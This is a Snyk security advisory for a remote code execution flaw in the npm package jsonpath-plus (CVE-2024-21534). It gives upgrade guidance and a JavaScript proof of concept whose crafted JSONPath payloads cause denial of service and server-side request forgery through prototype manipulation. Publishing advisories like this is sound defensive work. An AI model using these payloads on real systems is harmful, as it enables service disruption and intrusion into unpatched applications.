### Threat Intelligence

Exploit Maturity

Snyk has a proof-of-concept or detailed explanation of how to exploit this vulnerability.

Proof of conceptEPSS

The probability is the direct output of the EPSS model, and conveys an overall sense of the threat of
exploitation in the wild. The percentile measures the EPSS probability relative to all known EPSS scores.
Note: This data is updated daily, relying on the latest available EPSS model version.

[CVE-2024-21534  (opens in a new tab)](https://www.cve.org/CVERecord?id=CVE-2024-21534) Common Vulnerabilities and Exposures (CVE) are common identifiers for publicly known security vulnerabilities[CWE-94  (opens in a new tab)](https://cwe.mitre.org/data/definitions/94.html) Common Weakness Enumeration (CWE) is a category system for software weaknesses First added by Snyk
## How to fix?

Upgrade `jsonpath-plus` to version 10.2.0 or higher.

## Overview

[jsonpath-plus](https://www.npmjs.org/package/jsonpath-plus) is an A JS implementation of JSONPath with some additional operators

Affected versions of this package are vulnerable to Remote Code Execution (RCE) due to improper input sanitization. An attacker can execute aribitrary code on the system by exploiting the unsafe default usage of `vm` in Node.

**Note:**

There were several attempts to fix it in versions [10.0.0-10.1.0](https://github.com/JSONPath-Plus/JSONPath/compare/v9.0.0...v10.1.0) but it could still be exploited using [different payloads](https://github.com/JSONPath-Plus/JSONPath/issues/226).

## PoC

```
const { JSONPath } = require("jsonpath-plus");

const pathDoS =
  "$[?(con = constructor; dp = con.defineProperty; gopd = con.getOwnPropertyDescriptor; f = gopd(con, 'entries').value; alt = gopd(con.getPrototypeOf(f), 'apply'); dp(con.getPrototypeOf(_$_root.body), 'toString', alt);)]";
const pathSsrf =
  "$[?(con = constructor; dp = con.defineProperty; dp(con.prototype, 'referrer', _$_root.referrer); dp(con.prototype, 'method', _$_root.method); dp(con.prototype, 'body', _$_root.body);)]";

const result = JSONPath({
  json: {
    referrer: {
      value: "http://authorized.com",
      writable: true,
    },
    method: {
      value: "POST",
      writable: true,
    },
    body: {
      value: "Hello, World!",
      writable: true,
    },
  },
  path: pathDoS,
});

result.toString(); //DoS

//fetch("http://localhost:3000"); // ssrf with possible privilege escalation via lateral movement
